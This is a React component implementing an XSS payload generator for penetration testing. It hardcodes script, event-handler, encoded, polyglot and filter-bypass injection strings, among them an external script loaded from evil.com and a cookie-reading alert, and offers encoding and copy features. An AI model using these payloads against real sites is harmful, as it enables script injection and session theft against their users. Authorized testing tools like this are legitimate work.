import React, { useState } from 'react';
import type { XssPayloadData, XssPayloadCategory } from './tool-types';

// Educational payloads for authorized security testing
const PAYLOADS: Record<XssPayloadCategory, { name: string; payload: string; description: string }[]> = {
  basic: [
    { name: 'Basic Alert', payload: '<script>alert(1)</script>', description: 'Classic script injection' },
    { name: 'Script with domain', payload: '<script>alert(document.domain)</script>', description: 'Shows current domain' },
    { name: 'Script with cookie', payload: '<script>alert(document.cookie)</script>', description: 'Displays cookies (if not HttpOnly)' },
    { name: 'External script', payload: '<script src="//evil.com/xss.js"></script>', description: 'Loads external script' }
  ],
  events: [
    { name: 'IMG onerror', payload: '<img src=x onerror=alert(1)>', description: 'Error event handler' },
    { name: 'SVG onload', payload: '<svg onload=alert(1)>', description: 'SVG load event' },
    { name: 'BODY onload', payload: '<body onload=alert(1)>', description: 'Body load event' },
    { name: 'INPUT onfocus', payload: '<input onfocus=alert(1) autofocus>', description: 'Input focus event' },
    { name: 'DIV onmouseover', payload: '<div onmouseover=alert(1)>hover</div>', description: 'Mouse event' },
    { name: 'DETAILS ontoggle', payload: '<details open ontoggle=alert(1)>', description: 'Details toggle event' }
  ],
  encoded: [
    { name: 'HTML entities', payload: '&lt;script&gt;alert(1)&lt;/script&gt;', description: 'HTML entity encoded' },
    { name: 'Unicode escape', payload: '\\u003cscript\\u003ealert(1)\\u003c/script\\u003e', description: 'JavaScript Unicode' },
    { name: 'Hex encoding', payload: '<script>alert(String.fromCharCode(88,83,83))</script>', description: 'Character codes' },
    { name: 'Base64 eval', payload: '<script>eval(atob("YWxlcnQoMSk="))</script>', description: 'Base64 encoded payload' }
  ],
  polyglot: [
    { name: 'Multi-context', payload: "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e", description: 'Works in multiple contexts' },
    { name: 'IMG/Script hybrid', payload: '"><img src=x onerror=alert(1)><"', description: 'Breaks out of attributes' }
  ],
  'filter-bypass': [
    { name: 'Case variation', payload: '<ScRiPt>alert(1)</sCrIpT>', description: 'Mixed case bypass' },
    { name: 'Null byte', payload: '<scr\\x00ipt>alert(1)</script>', description: 'Null byte insertion' },
    { name: 'Double encoding', payload: '%253Cscript%253Ealert(1)%253C/script%253E', description: 'Double URL encoding' },
    { name: 'SVG/use', payload: '<svg><use href="data:image/svg+xml,<svg id=x xmlns=http://www.w3.org/2000/svg><image href=1 onerror=alert(1) /></svg>#x" />', description: 'SVG use element' }
  ]
};

const CATEGORIES: { id: XssPayloadCategory; label: string }[] = [
  { id: 'basic', label: 'Basic Script' },
  { id: 'events', label: 'Event Handlers' },
  { id: 'encoded', label: 'Encoded' },
  { id: 'polyglot', label: 'Polyglot' },
  { id: 'filter-bypass', label: 'Filter Bypass' }
];

type Props = {
  data: XssPayloadData | undefined;
  onChange: (next: XssPayloadData) => void;
};

const XssPayloadToolComponent = ({ data, onChange }: Props) => {
  const category: XssPayloadCategory = data?.category ?? 'basic';
  const selectedPayload = data?.selectedPayload ?? '';
  const customPayload = data?.customPayload ?? '';
  const encodeUrl = data?.encodeUrl ?? false;
  const encodeHtml = data?.encodeHtml ?? false;
  const [copied, setCopied] = useState(false);

  const handleSelectPayload = (payload: string) => {
    let output = payload;
    if (encodeUrl) {
      output = encodeURIComponent(output);
    }
    if (encodeHtml) {
      output = output
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#39;');
    }
    onChange({ ...data, selectedPayload: output });
  };

  const handleCopy = () => {
    const payload = selectedPayload || customPayload;
    if (payload) {
      navigator.clipboard.writeText(payload);
      setCopied(true);
      setTimeout(() => setCopied(false), 1500);
    }
  };

  const currentPayloads = PAYLOADS[category] || [];

  return (
    <div className="space-y-3">
      <div className="text-xs text-slate-200">XSS Payload Generator</div>

      {/* Educational disclaimer */}
      <div className="text-[10px] text-amber-300 bg-amber-900/20 border border-amber-800 rounded px-2 py-1.5">
        For authorized security testing and educational purposes only.
        Only use on systems you have explicit permission to test.
      </div>

      {/* Category selector */}
      <div className="space-y-1">
        <div className="text-[11px] text-slate-400">Category</div>
        <div className="flex flex-wrap gap-1">
          {CATEGORIES.map((cat) => (
            <button
              key={cat.id}
              type="button"
              onClick={() => onChange({ ...data, category: cat.id })}
              className={`rounded px-2 py-1 text-[10px] transition-colors ${
                category === cat.id
                  ? 'bg-emerald-600 text-white'
                  : 'bg-slate-800 text-slate-300 hover:bg-slate-700'
              }`}
            >
              {cat.label}
            </button>
          ))}
        </div>
      </div>

      {/* Encoding options */}
      <div className="flex gap-3">
        <label className="flex items-center gap-1 text-[10px] text-slate-400 cursor-pointer">
          <input
            type="checkbox"
            checked={encodeUrl}
            onChange={(e) => onChange({ ...data, encodeUrl: e.target.checked })}
            className="rounded border-slate-600 bg-slate-800 text-emerald-500"
          />
          URL Encode
        </label>
        <label className="flex items-center gap-1 text-[10px] text-slate-400 cursor-pointer">
          <input
            type="checkbox"
            checked={encodeHtml}
            onChange={(e) => onChange({ ...data, encodeHtml: e.target.checked })}
            className="rounded border-slate-600 bg-slate-800 text-emerald-500"
          />
          HTML Encode
        </label>
      </div>

      {/* Payload list */}
      <div className="space-y-1">
        <div className="text-[11px] text-slate-400">Payloads</div>
        <div className="space-y-1 max-h-40 overflow-y-auto">
          {currentPayloads.map((p, i) => (
            <div
              key={i}
              className="bg-slate-800 rounded p-2 cursor-pointer hover:bg-slate-700 transition-colors"
              onClick={() => handleSelectPayload(p.payload)}
            >
              <div className="text-[11px] text-emerald-400">{p.name}</div>
              <div className="text-[10px] text-slate-400">{p.description}</div>
            </div>
          ))}
        </div>
      </div>

      {/* Selected payload display */}
      {selectedPayload && (
        <div className="space-y-1">
          <div className="flex items-center justify-between">
            <div className="text-[11px] text-slate-400">Selected Payload</div>
            <button
              type="button"
              onClick={handleCopy}
              className="text-[10px] text-slate-400 hover:text-white transition-colors"
            >
              {copied ? 'Copied!' : 'Copy'}
            </button>
          </div>
          <div
            className="bg-slate-900 border border-slate-700 rounded p-2 text-[10px] text-rose-300 font-mono break-all select-all cursor-pointer"
            onClick={handleCopy}
          >
            {selectedPayload}
          </div>
        </div>
      )}

      {/* Custom payload input */}
      <div className="space-y-1">
        <div className="text-[11px] text-slate-400">Custom Payload</div>
        <textarea
          value={customPayload}
          onChange={(e) => onChange({ ...data, customPayload: e.target.value })}
          rows={2}
          className="w-full rounded bg-slate-800 text-slate-200 text-xs px-2 py-2 border border-slate-700 focus:outline-none focus:border-emerald-500 font-mono"
          placeholder="Enter custom payload..."
        />
      </div>

      {/* Info */}
      <div className="text-[10px] text-slate-500">
        Use these payloads responsibly for penetration testing with proper authorization.
      </div>
    </div>
  );
};

export class XssPayloadTool {
  static Component = XssPayloadToolComponent;
}
